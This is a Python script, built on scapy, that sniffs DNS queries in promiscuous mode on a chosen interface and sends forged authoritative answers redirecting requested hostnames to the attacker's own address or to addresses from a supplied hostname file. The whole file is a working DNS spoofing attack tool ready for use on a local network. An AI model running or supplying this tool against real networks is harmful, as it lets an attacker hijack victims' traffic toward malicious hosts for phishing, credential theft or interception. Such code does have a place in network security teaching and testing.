import argparse

import netifaces
from scapy.all import *
from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.inet import IP, UDP, TCP

conf.sniff_promisc = True  # Set promiscuous mode to true

def spoof_packet(sniffed_packet):
    """
    This function analyses the sniffed packet and performs a packet injection if it meets the criteria
    :param sniffed_packet: The sniffed packet
    :return:
    """

    # We check if the captured packet is indeed a DNS packet and if it is a type A DNS packet
    # and it is a request packet
    if sniffed_packet.haslayer(DNSQR) \
            and sniffed_packet[DNS].ancount == 0 \
            and sniffed_packet[DNS].qd.qtype == 1:
        inject_ip = 0
        item = sniffed_packet[DNS].qd.qname[:-1]

        # If a data file has been provided, check if the captured packet has requested for a hostname in the
        # data file
        if file_specified :
            if data_dict.get(item):
                inject_ip = data_dict[item]
            else:
                return
        elif file_specified == 0:
            netifaces.ifaddresses(device)
            inject_ip = netifaces.ifaddresses(device)[netifaces.AF_INET][0]['addr']

        # Construct the packet with IP, UDP/TCP and DNS headers and provide the spoofed
        # address to the rdata of the answer section
        ip_destination = sniffed_packet[IP].dst
        ip_source = sniffed_packet[IP].src
        spoofed_pkt = IP(dst=ip_source, src=ip_destination)
        if sniffed_packet.haslayer(UDP):
            udp_dport = sniffed_packet[UDP].dport
            udp_sport = sniffed_packet[UDP].sport
            spoofed_pkt = spoofed_pkt / UDP(dport=udp_sport, sport=udp_dport)
        if sniffed_packet.haslayer(TCP):
            tcp_dport = sniffed_packet[TCP].dport
            tcp_sport = sniffed_packet[TCP].sport
            spoofed_pkt = spoofed_pkt / TCP(dport=tcp_sport, sport=tcp_dport)
        dns_id = sniffed_packet[DNS].id
        dns_question_count = sniffed_packet[DNS].qd
        dns_rname = sniffed_packet[DNS].qd.qname  # Resource record name
        spoofed_pkt = spoofed_pkt / DNS(id=dns_id, qd=dns_question_count, aa=1, qr=1,
                                        an=DNSRR(rrname=dns_rname, ttl=100, rdata=inject_ip))

        send(spoofed_pkt, verbose=0, iface=str(device))
        localtime = time.asctime(time.localtime(time.time()))
        print 'Packet sent at ', localtime


parser = argparse.ArgumentParser(add_help=False)
parser.add_argument("-i", help="Network Interface Device")
parser.add_argument("-h", help="Name of file containing ip hostname pair to spoof")
parser.add_argument("expression", help="bpf filter for the traffic to monitor")

args = parser.parse_args()
device = netifaces.gateways()['default'][netifaces.AF_INET][1]

file_specified = 0
data_dict = {}
if args.i:
    device = args.i
if args.h:
    file_specified = 1
    f = open(args.h, "r")
    for line in f:
        data = line.split()
        data_dict[data[1]] = data[0]
    f.close()

bpf_filter = "udp port 53"
if args.expression != "":
    bpf_filter = bpf_filter + " and " + args.expression
sniff(filter=bpf_filter, prn=spoof_packet, store=0, iface=str(device))
